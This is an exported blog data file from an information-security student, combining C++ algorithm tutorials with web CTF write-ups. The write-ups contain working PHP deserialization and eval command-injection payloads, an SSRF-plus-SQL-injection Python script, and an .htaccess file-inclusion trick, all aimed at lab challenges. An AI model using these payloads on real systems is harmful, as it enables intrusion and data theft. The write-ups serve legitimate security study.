{"meta":{"title":"花城","subtitle":"花城の博客","description":"本科 | 太原理工大学 | 信息安全","author":"花城","url":"https://huacheng1122.cn","root":"/"},"pages":[{"title":"404","date":"2019-08-10T08:41:10.000Z","updated":"2021-09-25T01:03:03.439Z","comments":true,"path":"404.html","permalink":"https://huacheng1122.cn/404.html","excerpt":"","text":""},{"title":"放松一下","date":"2019-08-10T08:41:10.000Z","updated":"2021-09-25T01:03:03.458Z","comments":true,"path":"List/index.html","permalink":"https://huacheng1122.cn/List/index.html","excerpt":"","text":"影音资源共享"},{"title":"","date":"2021-09-26T04:36:41.896Z","updated":"2021-09-26T04:36:41.896Z","comments":true,"path":"baidu_verify_code-m7XmXYVUbo.html","permalink":"https://huacheng1122.cn/baidu_verify_code-m7XmXYVUbo.html","excerpt":"","text":"aed9da353918032f2fbb28bf2b3a4a22"},{"title":"about","date":"2019-10-24T16:00:00.000Z","updated":"2021-09-25T01:03:03.619Z","comments":true,"path":"about/index.html","permalink":"https://huacheng1122.cn/about/index.html","excerpt":"","text":""},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2021-09-25T01:03:03.629Z","comments":true,"path":"archives/index.html","permalink":"https://huacheng1122.cn/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-10-24T16:00:00.000Z","updated":"2021-09-25T01:03:03.629Z","comments":true,"path":"categories/index.html","permalink":"https://huacheng1122.cn/categories/index.html","excerpt":"","text":""},{"title":"统计","date":"2020-10-31T02:11:28.000Z","updated":"2021-09-25T01:03:03.629Z","comments":true,"path":"census/index.html","permalink":"https://huacheng1122.cn/census/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-07-19T08:42:10.000Z","updated":"2021-09-25T01:03:03.629Z","comments":true,"path":"friends/index.html","permalink":"https://huacheng1122.cn/friends/index.html","excerpt":"","text":""},{"title":"留言板","date":"2019-10-24T16:00:00.000Z","updated":"2021-09-26T12:50:56.301Z","comments":true,"path":"contact/index.html","permalink":"https://huacheng1122.cn/contact/index.html","excerpt":"","text":"畅所欲言 在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！ 友链 花城の友链信息 博客名称: 花城の博客 博客网址: https://huacheng1122.cn 博客头像: https://bucket-1305778438.cos.ap-shanghai.myqcloud.com/myblog/logo2.jpg 博客介绍: The harder you work, the luckier you will be"},{"title":"tags","date":"2019-07-19T08:40:27.000Z","updated":"2021-09-25T01:03:03.637Z","comments":true,"path":"tags/index.html","permalink":"https://huacheng1122.cn/tags/index.html","excerpt":"","text":""},{"title":"资源分享","date":"2019-07-19T08:40:27.000Z","updated":"2021-09-25T01:03:03.635Z","comments":true,"path":"resource/index.html","permalink":"https://huacheng1122.cn/resource/index.html","excerpt":"","text":""},{"title":"相册","date":"2021-09-25T17:04:00.468Z","updated":"2021-09-25T01:03:03.449Z","comments":true,"path":"List/galleries/index.html","permalink":"https://huacheng1122.cn/List/galleries/index.html","excerpt":"","text":""},{"title":"视频","date":"2019-08-10T08:41:10.000Z","updated":"2021-09-25T01:03:03.466Z","comments":true,"path":"List/movies/index.html","permalink":"https://huacheng1122.cn/List/movies/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2021-09-25T01:03:03.466Z","comments":true,"path":"List/music/index.html","permalink":"https://huacheng1122.cn/List/music/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2021-09-25T01:03:03.466Z","comments":true,"path":"List/tools/index.html","permalink":"https://huacheng1122.cn/List/tools/index.html","excerpt":"","text":""},{"title":"宇航员和月亮的故事","date":"2021-09-25T16:44:08.387Z","updated":"2021-09-25T16:43:44.141Z","comments":true,"path":"List/galleries/宇航员和月亮的故事/index.html","permalink":"https://huacheng1122.cn/List/galleries/%E5%AE%87%E8%88%AA%E5%91%98%E5%92%8C%E6%9C%88%E4%BA%AE%E7%9A%84%E6%95%85%E4%BA%8B/index.html","excerpt":"","text":""}],"posts":[{"title":"","slug":"China","date":"2021-09-29T13:45:42.000Z","updated":"2021-09-29T14:15:27.122Z","comments":true,"path":"posts/0.html","link":"","permalink":"https://huacheng1122.cn/posts/0.html","excerpt":"","text":"中国万岁！","categories":[{"name":"博客篇","slug":"博客篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"}],"tags":[{"name":"博客","slug":"博客","permalink":"https://huacheng1122.cn/tags/%E5%8D%9A%E5%AE%A2/"}],"author":"花城"},{"title":"i春秋CTF之Hash","slug":"i春秋CTF之Hash","date":"2021-09-29T13:19:55.000Z","updated":"2021-09-29T13:32:51.051Z","comments":true,"path":"posts/801e5393.html","link":"","permalink":"https://huacheng1122.cn/posts/801e5393.html","excerpt":"","text":"0x001 wp 打开题目，点击进入链接 有一个提示，要求改变key的值和哈希值，查看源代码 提示$hash=md5($sign.$key);the length of $sign is 8 解密key=123对应的哈希值：kkkkkk01123 所以sign=‘kkkkkk01’ 然后就好说了，改变key=321，md5加密'kkkkkk01321' 传入 提示下一步，访问Gu3ss_m3_h2h2.php 好家伙。代码审计一波 demo类里有一些魔法函数，联想到反序列化漏洞 get传入参数var，先base_64解码，然后preg_match正则过滤， /[oc]:\\d+:/i \\d 是匹配一个数字，+是一个或者多个 最后反序列化var，还提示 the secret is in the f15g_1s_here.php 反序列化漏洞详解参考：反序列化漏洞 所以我们需要传入var来访问f15g_1s_here.php这个东西： 1.修改file属性为f15g_1s_here.php，序列化对象 2.base_64编码 但是有一个问题，反序列化是会先检查有没有__wakeup()函数，如果有会先执行wakeup函数，__wakeup()函数会改变file的值，所以必须绕过__wakeup()函数 魔法函数wakeup绕过 改变步骤： 1.修改file属性为f15g_1s_here.php，序列化对象 2.改变序列化字符串的属性数目大于实际（绕过__wakeup） 2.base_64编码 再接着想，反序列化之前还有一次过滤呀~~还得绕过 正则匹配到‘O:4’就会报错，怎么绕过呢~ 把4变成+4就可以 改变步骤： 1.修改file属性为f15g_1s_here.php，序列化对象 2.改变序列化字符串的属性数目大于实际（绕过__wakeup） 3.替换‘O:4’为‘O:+4’ 2.base_64编码 步骤有了，脚本实现一下~ &lt;?php class Demo { private $file = 'f15g_1s_here.php'; } $x = new Demo; $c = serialize($x); $c = str_replace('O:4','O:+4',$c); $c = str_replace(':1:',':2:',$c); $d = base64_encode($c); echo ($d); ?&gt; 把跑出来的var传参得到f15g_1s_here.php的源码 再看代码。。 需要get传参val；后面又有一个eval函数，addslashes对val进行了转义 又是考绕过，如果没有转义函数的话，可以构造 val = ${eval(echo `ls`;)} #ls反引号括住 但是addslashes转义了，可以考虑把echo命令变成变量绕过 val=${eval($_GET[a])}&amp;a=echo `ls`; 传参后得到目录文件True_F1ag_i3_Here_233.php 修改命令cat True_F1ag_i3_Here_233.php 什么都没有。。查看源码 拿到flag:flag{64402796-e35d-4fef-8432-ebdfb459a157} 知识点： 1.hash 2.反序列化 3.命令执行 0x002 结束语 熬过无人问津的日子，才有诗和远方","categories":[{"name":"博客篇","slug":"博客篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"},{"name":"CTF笔记篇","slug":"博客篇/CTF笔记篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/CTF%E7%AC%94%E8%AE%B0%E7%AF%87/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://huacheng1122.cn/tags/CTF/"},{"name":"web","slug":"web","permalink":"https://huacheng1122.cn/tags/web/"}],"author":"花城"},{"title":"攻防世界web高手进阶之ics-02","slug":"攻防世界web高手进阶之ics-02","date":"2021-09-29T12:50:41.000Z","updated":"2021-09-29T13:10:33.596Z","comments":true,"path":"posts/83a42f54.html","link":"","permalink":"https://huacheng1122.cn/posts/83a42f54.html","excerpt":"","text":"0x001 wp 进入文档中心页面，点击paper可以下载pdf文件，请求download.php，参数为dl pdf文件内容为ssrf，可能为线索 接着扫一遍目录，发现了/secret目录 访问一下试试 分别访问 看到私密页面1，查看元素，填完表提交，到达私密页面2，元素有一个变量s，s=3时返回页面2 发现secret_debug.php无法访问 到这里就无头绪了，wp大法，利用download.php传参进行ssrf攻击 虽然只能下载pdf文件，但是下载一个不存在的文件的时候readfile函数还是会执行的。 根据secret参数带入secret_debug构造请求 http://111.200.241.244:64242/secret/secret_debug.php？s=3&amp;txtfirst_name=a&amp;txtmiddle_name=b&amp;txtlast_name=c&amp;txtname_suffix=d &amp;txtdob=01/05/2000&amp;txtdl_nmbr=1234&amp;txtretypedl=1234 发现.pdf加在了s=3后面，&amp;符号导致，所以进行url编码，服务器再解码，.pdf就会加到所有参数最后 还是有问题，.pdf加在最后一个参数后面会影响其值，所以在参数后面再加一个&amp;，相当于隔断了pdf 注册成功。。注册的参数可以进行sql注入，大神的脚本 import requests import random import urllib url = ' http://111.200.241.244:64242//download.php' # subquery = \"database()\" # ssrfw # subquery = \"select group_concat(table_name) from information_schema. tables where table_schema='ssrfw'\" # etcYssrf,users # subquery = \"select group_concat(column_name) from information_schema.columns where table_name='cetcYssrf'\" # secretName,value # subquery = \"select secretName from cetcYssrf LIMIT 1\" # secretname -&gt; flag subquery = \"select value from cetcYssrf LIMIT 1\" # value -&gt; flag{cpg9ssnu_OOOOe333eetc_2018} id = random.randint(1, 10000000) dl = ('http://127.0.0.1/secret/secret_debug.php?' + urllib.parse.urlencode({ \"s\": \"3\", \"txtfirst_name\": \"A','b',(\"+subquery+\"),'c'/*\", \"txtmiddle_name\": \"B\", \"txtLast_name\": \"C\", \"txtname_suffix\": \"D.\", \"txtdob\": \"*/,'01/10/2019\", \"txtdl_nmbr\": id, \"txtRetypeDL\": id }) + \"&amp;\") r = requests.get(url, params={\"dl\": dl}) print(r.text) 知识点： 1.ssrf 2.sql注入 0x001 结束语 莫忘少年凌云志 曾许天下第一流","categories":[{"name":"博客篇","slug":"博客篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"},{"name":"CTF笔记篇","slug":"博客篇/CTF笔记篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/CTF%E7%AC%94%E8%AE%B0%E7%AF%87/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://huacheng1122.cn/tags/CTF/"},{"name":"web","slug":"web","permalink":"https://huacheng1122.cn/tags/web/"}],"author":"花城"},{"title":"攻防世界web高手进阶之blgdel","slug":"攻防世界web高手进阶之blgdel","date":"2021-09-29T12:25:36.000Z","updated":"2021-09-29T12:43:03.568Z","comments":true,"path":"posts/801ceb23.html","link":"","permalink":"https://huacheng1122.cn/posts/801ceb23.html","excerpt":"","text":"0x001 wp 打开页面 查看页面后，常规操作~扫一下目录 发现几个目录可能有线索robots.txt config.txt 代码审计 &lt;?php class master { private $path; private $name; function __construct() { } function stream_open($path) { if(!preg_match('/(.*)\\/(.*)$/s',$path,$array,0,9)) return 1; $a=$array[1]; parse_str($array[2],$array); if(isset($array['path'])) { $this-&gt;path=$array['path']; } else return 1; if(isset($array['name'])) { $this-&gt;name=$array['name']; } else return 1; if($a==='upload') { return $this-&gt;upload($this-&gt;path,$this-&gt;name); } elseif($a==='search') { return $this-&gt;search($this-&gt;path,$this-&gt;name); } else return 1; } function upload($path,$name) { if(!preg_match('/^uploads\\/[a-z]{10}\\/$/is',$path)||empty($_FILES[$name]['tmp_name'])) return 1; $filename=$_FILES[$name]['name']; echo $filename; $file=file_get_contents($_FILES[$name]['tmp_name']); $file=str_replace('&lt;','!',$file); $file=str_replace(urldecode('%03'),'!',$file); $file=str_replace('\"','!',$file); $file=str_replace(\"'\",'!',$file); $file=str_replace('.','!',$file); if(preg_match('/file:|http|pre|etc/is',$file)) { echo 'illegalbbbbbb!'; return 1; } file_put_contents($path.$filename,$file); file_put_contents($path.'user.jpg',$file); echo 'upload success!'; return 1; } function search($path,$name) { if(!is_dir($path)) { echo 'illegal!'; return 1; } $files=scandir($path); echo '&lt;/br&gt;'; foreach($files as $k=&gt;$v) { if(str_ireplace($name,'',$v)!==$v) { echo $v.'&lt;/br&gt;'; } } return 1; } function stream_eof() { return true; } function stream_read() { return ''; } function stream_stat() { return ''; } } stream_wrapper_unregister('php'); stream_wrapper_unregister('phar'); stream_wrapper_unregister('zip'); stream_wrapper_register('master','master'); ?&gt; 还有sql.txt 数据库的一些信息 注册登录后，访问user.php 看到有文件上传，试着上传一句马，积分达到100分才可上传文件，通过刷推荐人达到，上传后，访问uploads路径下上传的文件 发现代码被过滤，查看config.txt,上传的文件内容过滤了&lt;等符号看了dalao的wp，说是这里可以上传.htaccess文件，用.htaccess修改配置文件 .htaccess相关介绍，在这里https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.htmlhttps://blog.csdn.net/cmzhuang/article/details/53537591 第一步，通过构造master伪协议来搜索flag php_value auto_append_file master://search/path=%2fhome%2f&amp;name=flag wp说的要把正斜杠编码%2f传入才行，原因未知 写入.htaccess文件后上传，在上传随便一个php文件，这样访问php文件时就会执行 查到flag文件名 第二步，再修改.htaccess内容，包含文件名 php_value auto_append_file /home/hiahiahia_flag 再次上传.htaccess文件，访问php 拿到flag:cyberpeace{1b39ac65b450f1a0b22e5b073c851347} 知识点： 1.代码审计 2.文件包含 3.htaccess 0x002 结束语 自信至上 禁止低头 我心里有一簇迎着烈阳而生的花","categories":[{"name":"博客篇","slug":"博客篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"},{"name":"CTF笔记篇","slug":"博客篇/CTF笔记篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/CTF%E7%AC%94%E8%AE%B0%E7%AF%87/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://huacheng1122.cn/tags/CTF/"},{"name":"web","slug":"web","permalink":"https://huacheng1122.cn/tags/web/"}],"author":"花城"},{"title":"图像压缩问题","slug":"图像压缩问题","date":"2021-09-29T11:03:51.000Z","updated":"2021-09-29T11:21:03.823Z","comments":true,"path":"posts/c531792e.html","link":"","permalink":"https://huacheng1122.cn/posts/c531792e.html","excerpt":"","text":"0x001 问题描述 给定一张灰度图，其像素为长度为$n$的灰度值序列：{$p_1,p_2,\\cdots,p_n$}，其中$p_i \\in [0:1:255]$可表示为8位二进制数。现使用一种变位压缩方式对图像进行压缩，具体压缩过程如下： 将{$p_1,p_2,\\cdots,p_n$}分割成为$m$段：$S_1,S_2,\\cdots,S_m$； $l[i]$为$S_i$段的像素数，要求$l[i]\\leq 256$； $h_i$为$S_i$段中最大像素灰度值对应的二进制位数，则有 h_i=\\left \\lceil\\log\\left(\\max\\limits_{p_k \\in s_i}\\{p_k\\}+1\\right)\\right\\rceil $b[i]$为$S_i$段中所有像素的灰度值二进制表示的最小位数，则有 h_i \\leq b[i] \\leq 8每个分段$S_i$的段头都有11位 $b[i]\\leq 8$的二进制表示：3位 $l[i]\\leq 256$的二进制表示：8位 $S_i$段的二进制总位数（占用空间）：$11+b[i]\\times l[i]$； 可以看出，不同的分段方案$T={S_1,S_2,\\cdots,S_j}$导致不同的变位压缩结果，即占用不同大小的总空间。现需要确定空间占用最小的分段方案，即 \\min\\limits_{T}\\left\\{\\sum_{i=1}^{j}(b[i]\\times l[i]+11)\\right\\}0x002 约束条件 图像压缩问题中约束条件是：$l[i]\\leq 256$，即每个段中的像素数不超过256个。也就是说只要不违背这个约束条件的所有解均是可行解。 0x003 目标函数 图像压缩问题是最小化问题，其目标函数是：各个分段占用空间之和，即 \\sum_{i=1}^{j}(b[i]\\times l[i]+11)0x004 算法设计 子问题边界参数化在该问题中，我们将问题的左侧边界固定，右侧边界进行参数化，所有子问题可建模为：像素序列$P_i={p_1,p_2,\\cdots,p_i}, i=1,2,\\cdots,n$。 递推方程设计设$s[i]$是像素序列$P_i={p_1,p_2,\\cdots,p_i}，i=1,2,\\cdots,n$的最优分段所需存储的位数，则递推关系设计如下： \\begin{cases} s[i]=\\min\\limits_{1\\leq j \\leq \\min\\{i,256\\}}\\left\\{s[i-j]+j\\times b_{max}(i-j+1,i)+11\\right\\} \\\\ s[0] = 0 \\end{cases}其中，$b{max}(i-j+1,i)=\\left\\lceil \\log \\left ( \\max\\limits{p_k \\in S_m}p_k + 1 \\right )\\right\\rceil \\leq 8$。 0x005 算法的伪代码描述 tidy function Compress(n, p, l, s, b) lmax ← 256;header ← 11;s[0] ← 0 for i = 1 → n do b[i] ← length(p[i]) bmax ← b[i] s[i] ← s[i − 1] + bmax l[i] ← 1 for j = 2 → min i, lmax do if bmax &lt; b[i − j + 1] then bmax ← b[i − j + 1] if s[i] &gt; s[i − j] + j ∗ bmax then s[i] ← s[i − j] + j ∗ bmax l[i] ← j s[i] ← s[i] + header return s, b, l end function function Traceback(n, i, s, l) i ← 0 if n == 0 then return Traceback(n − l[n], i, s, l) s[i + +] ← n − l[n] end function 0x006 算法时空效率估计 (1）估计算法Compress的时间复杂度，试给出详细过程。 Compress只需$O(n)$,由于在算法中j的次数不超过256次，故对每一个确定的i可在$O(1)$时间内完成，因此时间复杂度为$O(n)$. (2)估计算法Traceback的时间复杂度，试给出详细过程。 由于数组$l[i],b[i]$记录了最优分段所需的信息，最优分段的最后一段的段长度和像素位数分别存在$l[n],b[n]$中，其前一段的段长度和像素位数存储于$l[n-l[n]]$和$b[n-l[n]]$中，依次类推，在$O(n)$时间内构造最优解。 0x007 编码实现 #include&lt;iostream&gt; #include&lt;vector&gt; using namespace std; //灰度值二进制位数 int Length(int i){ int k = 1; i = i/2; while(i &gt; 0){ k ++; i = i/2; } return k; } //迭代备忘录实现动态规划 void Compress(int n,vector&lt;int&gt; &amp;p,vector&lt;int&gt; &amp;s,vector&lt;int&gt; &amp;l,vector&lt;int&gt; &amp;b){ int lmax = 256; int header = 11;//分段首部 s[0] = 0; int bmax; for(int i = 1;i &lt;= n;i ++){ b[i] = Length(p[i]); bmax = b[i]; s[i] = s[i-1] + bmax; l[i] = 1; int k = 0; if(i &gt; lmax){ k = lmax; }else{ k = i; }//k取lmax和 i的较小值 for(int j = 2;j &lt;= k;j ++){ if(bmax &lt; b[i-j+1]){ bmax = b[i-j+1]; } if(s[i] &gt; s[i-j]+j*bmax){ s[i] = s[i-j]+j*bmax; l[i] = j;//记录分段 } } s[i] = s[i] + header;//加上首部 } } //递归追踪解 void Traceback(int n,int&amp; i,vector&lt;int&gt; &amp;s,vector&lt;int&gt; &amp;l){ if(n == 0){ return; } Traceback(n-l[n],i,s,l); s[i++] = n-l[n];//用s表记录分段位置 } int main(){ int n; cin &gt;&gt; n; vector&lt;int&gt; s,b,l,p; for(int i = 0;i &lt;= n;i ++){ s.push_back(0); b.push_back(0); l.push_back(0); p.push_back(0); } for(int i = 1;i &lt;= n;i ++){ int p1; cin &gt;&gt; p1; p[i] = p1; } Compress(n,p,s,l,b); cout &lt;&lt; \"最小存储位数：\" &lt;&lt; s[n] &lt;&lt; endl; int m = 0; Traceback(n,m,s,l); s[m] = n; cout &lt;&lt; \"共分段数:\" &lt;&lt; m &lt;&lt; endl; for(int j = 1;j &lt;= m;j ++){ l[j] = l[s[j]]; b[j] = b[s[j]]; } for(int j = 1;j &lt;= m;j ++){ cout &lt;&lt; \"此段个数：\" &lt;&lt; l[j] &lt;&lt; \"所需储存位数：\" &lt;&lt; b[j] &lt;&lt; endl; } return 0; } 0x008 结果展示 0x009 结束语 若结局非你所愿，请在尘埃定前奋力一搏","categories":[{"name":"博客篇","slug":"博客篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"},{"name":"算法篇","slug":"博客篇/算法篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/%E7%AE%97%E6%B3%95%E7%AF%87/"}],"tags":[{"name":"算法设计与分析","slug":"算法设计与分析","permalink":"https://huacheng1122.cn/tags/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/"},{"name":"c++","slug":"c","permalink":"https://huacheng1122.cn/tags/c/"}],"author":"花城"},{"title":"排兵布阵问题","slug":"排兵布阵问题","date":"2021-09-29T10:24:10.000Z","updated":"2021-09-29T10:38:13.531Z","comments":true,"path":"posts/7f393998.html","link":"","permalink":"https://huacheng1122.cn/posts/7f393998.html","excerpt":"","text":"0x001 问题描述 某游戏中，不同的兵种处于不同的地形上时，其攻击能力也一样，现有n个不同兵种的角色$(1, 2, \\cdots, n)$，需安排在某战区$n$个点上，角色$i$在$j$点上的攻击力为$A_{ij}$，试设计一个布阵方案，使总的攻击力最大。注：个人决定A矩阵的初始化工作。 0x002 目标函数 \\max \\{ \\sum_{i=1}^n power_i\\}0x003 解向量 用元组$(x_1,x_2,…x_n)$表示解，$x_i$表示角色i的位置。 0x004 显式约束 S_i=\\{1,2,...,n\\},1\\leq i \\leq n0x005 状态空间树 类型状态空间树是一颗排列树。 候选解规模叶子结点数有$n!$个。 0x006 隐式约束 对任意$1 \\leq i,j \\leq n$,当$i \\neq j$时，$x_i \\neq x_j$ 0x007 算法设计 算法的伪代码描述function backTrack(t, n) if t &gt; n then power ← 0 for i = 1 → n do power ← power + power1 if power &lt; powermax then powermax ← power x1 ← x else for i = 1 → n do x[t] ← i if Position(t) then backTrack(t + 1) end function function Position(k) for i = 1 → k − 1 do if x[i] == x[k] then return false return true end function 时间复杂度估计W(n) = p(n)f(n)$p(n)$为求解一个叶子节点的时间，$f(n)$为叶子节点的个数 编码实现#include&lt;iostream&gt; #include&lt;vector&gt; using namespace std; vector&lt;int&gt; x,x1; vector&lt;vector&lt;int&gt; &gt; p; int powermax = -1; int n; //判断角色k的位置是否可行 bool position(int k){ for(int i = 1;i &lt; k;i ++){ if(x[k] == x[i]){ return false; } } return true; } //回溯法求最优解 void backTrack(int t){ if(t &gt; n){//求总攻击力并更新最大值 int power = 0; for(int i = 1;i &lt;= n;i ++){ power = power + p[i][x[i]]; } if(power &gt; powermax){ powermax = power; x1 = x;//记录当前最优解的排列 } }else{//遍历可行排列 for(int i = 1;i &lt;= n;i ++){ x[t] = i; if(position(t)){ backTrack(t+1); } } } } int main(){ cin &gt;&gt; n; for(int i = 0;i &lt;= n;i ++){ x.push_back(0); x1.push_back(0); } for(int i = 0;i &lt;= n;i ++){ p.push_back(x); } for(int i = 1;i &lt;= n;i ++){ for(int j = 1;j &lt;= n;j ++){ int p1; cin &gt;&gt; p1; p[i][j] = p1; } } backTrack(1); cout &lt;&lt; \"最优解为：\" &lt;&lt; endl; for(int i = 1;i &lt;= n;i ++){ cout &lt;&lt; x1[i] &lt;&lt; \" \"; } cout &lt;&lt; \"最大攻击力为：\" &lt;&lt; powermax &lt;&lt; endl; return 0; } 程序调试与结果展示 0x008 结束语 别让怯懦否定了自己，别让懒惰耽误了青春","categories":[{"name":"博客篇","slug":"博客篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"},{"name":"算法篇","slug":"博客篇/算法篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/%E7%AE%97%E6%B3%95%E7%AF%87/"}],"tags":[{"name":"算法设计与分析","slug":"算法设计与分析","permalink":"https://huacheng1122.cn/tags/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/"},{"name":"c++","slug":"c","permalink":"https://huacheng1122.cn/tags/c/"}],"author":"花城"},{"title":"最优二叉搜索树问题","slug":"最优二叉搜索树问题","date":"2021-09-29T09:52:31.000Z","updated":"2021-09-29T10:04:15.810Z","comments":true,"path":"posts/a294f3d3.html","link":"","permalink":"https://huacheng1122.cn/posts/a294f3d3.html","excerpt":"","text":"0x001 问题描述 给定递增有序的元素序列$S=\\left \\langle a_1,a_2,\\cdots,a_n\\right \\rangle$与相关存取概率分布$C=\\left \\langle q(0), p(1), q(1), p(2), q(2), \\cdots, p(n), q(n) \\right \\rangle$，将这些元素存储在一棵二叉树的结点上，以查找$x$是否在这些数中。如果$x$不在，确定$x$在哪个空隙。设法构造一棵最优二叉搜索树使得平均查找次数$t$最小。一棵二叉搜索树的平均查找次数定义如下： t=\\sum_{i=1}^{n}{p(i)(1+d(i))}+\\sum_{j=0}^{n}{q(j)d(j)}其中，$d(i)$表示结点$ai$的深度，$i=1,2,\\cdots, n$；$d(j)$表示空隙(叶子)结点$(a_j, a{j+1})$的深度，$j=0,1,\\cdots, n$。 0x002 问题建模 1.子问题的边界参数化$S[i,j]=$是$S$ 以$i$和$j$作为边界的子数据集，$C[i，j]=$是对应$S[i,j]$存取概率分布。子问题划分：以$x_k$作为根划分成两个子问题 S[i,k-1],C[i，k-1]S[k+1,j],C[k+1，j]2.递推关系 设m[i,j]是相对于输入S[i,j]和C[i，j]的最优二叉搜索树的平均比较次数，令w[i,j]=\\sum_{p=i-1}^ja_p+\\sum_{q=i}^jb_q是C[i，j]中所有概率（包括数据元素与空隙）之和，则递推方程为 \\begin{cases} m[i,j]=\\min \\{m[i,k-1]+m[k+1,j]+w[i,j]\\} &\\text{if } 1\\leq i\\leq j \\leq n \\\\ m[i,i-1]=0 &\\text{if } i=1,2,...n \\end{cases}3.备忘录表与标记函数表 w:最优二叉搜索树的权; m:计算最优二叉搜索树的成本; r:最优二叉搜索树的根。 0x003 算法的复杂度分析 $i,j$的所有组合$O(n^2)$种，每种要对不同的k进行计算，$k=O(n)$每次计算为常数时间 T(n)=O(n^3),S(n)=O(n^2)0x004 算法的迭代实现伪代码描述 tidyfunction BST(p, q, n) let m[1...n+1,0...n],w[1...n+1,0...n] and r[1...n,1...n] be new tables for i = 1 → n + 1 do m[i, i − 1] ← 0 w[i, i − 1] ← qi−1 for l = 1 → n do for i = 1 → n − l + 1 do j ← i + l − 1 m[i, j] ← ∞ w[i, j] ← w[i, j − 1] + pj + qj for r = i → j do t ← m[i, r − 1] + m[r + 1, j] + w[i, j] if t &lt; m[i, j] then m[i, j] ← t r[i, j] ← r return m, r end function 0x005 迭代实现的源代码 #include&lt;iostream&gt; #include&lt;vector&gt; using namespace std; int main(){ int n; cin &gt;&gt; n; vector&lt;int&gt; S,C; vector&lt;vector&lt;int&gt; &gt; w,m,r;//定义备忘录表 vector&lt;int&gt; B; for(int i = 1;i &lt;= n;i ++){ int a; cin &gt;&gt; a; S.push_back(a); }//输入集合S for(int i = 0;i &lt; 2*n+1;i ++){ double a; cin &gt;&gt; a; C.push_back(100*a); }//输入存取概率，乘以100 for(int j = 0;j &lt;= n+1;j++){ B.push_back(0); } for(int i = 0;i &lt;= n+1;i++){ m.push_back(B); w.push_back(B); r.push_back(B); } for(int i = 1;i &lt;= n+1;i ++){ m[i][i-1] = 0; w[i][i-1] = C[2*(i-1)]; }//初始化备忘录表 for(int l = 1;l &lt;= n;l ++){ for(int i = 1;i &lt;= n-l+1;i ++){ int j = i+l-1; m[i][j] = 2147483647; w[i][j] = w[i][j-1] + C[2*j-1] + C[2*j]; for(int root = i;root &lt;= j;root ++){ int t = m[i][root-1] + m[root+1][j] + w[i][j]; if(t &lt; m[i][j]){ m[i][j] = t; r[i][j] = root; } } } }//利用备忘录法迭代实现构造最优二叉搜索树 for(int i = 1;i &lt;= n;i ++){ for(int j = 1;j &lt;= n;j ++){ cout &lt;&lt; r[i][j] &lt;&lt; \" \"; } cout &lt;&lt; endl; }//输出记录根节点的表 cout &lt;&lt; \"最小代价为\" &lt;&lt; (double)m[1][n]/100; return 0;//输出最小期望代价 } 0x006 运行结果截图 0x007 结束语 没有明确表达的爱意都是错觉","categories":[{"name":"博客篇","slug":"博客篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/"},{"name":"算法篇","slug":"博客篇/算法篇","permalink":"https://huacheng1122.cn/categories/%E5%8D%9A%E5%AE%A2%E7%AF%87/%E7%AE%97%E6%B3%95%E7%AF%87/"}],"tags":[{"name":"算法设计与分析","slug":"算法设计与分析","permalink":"https://huacheng1122.cn/tags/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/"},{"name":"c++","slug":"c","permalink":"https://huacheng1122.cn/tags/c/"}],"author":"花城"},{"title":"MonteCarlo方法","slug":"MonteCarlo方法","date":"2021-09-29T09:40:47.000Z","updated":"2021-09-29T09:46:56.655Z","comments":true,"path":"posts/1960c1bd.html","link":"","permalink":"https://huacheng1122.cn/posts/1960c1bd.html","excerpt":"","text":"0x001 估计四皇后搜索树的结点数 case1：&lt;1,4,2&gt;第一行选择放在第一列（四选一），之后第二行可以放在第三、四列（二选一），第二行选择放在第四列，之后第三行只能放在第二列（一选一），第四行无法放。（搜索树中每条边代表一个选择）$1+4+4\\times 2+4\\times 2=21$ case2：&lt;2,4,1,3&gt;第一行放在第二列（四选一）之后，其他三列位置固定（全是一选一）$4\\times 4 +1=17$ case3：&lt;1,3&gt;$1+4\\times 1+4\\times 2=13$ 0x002 结束语 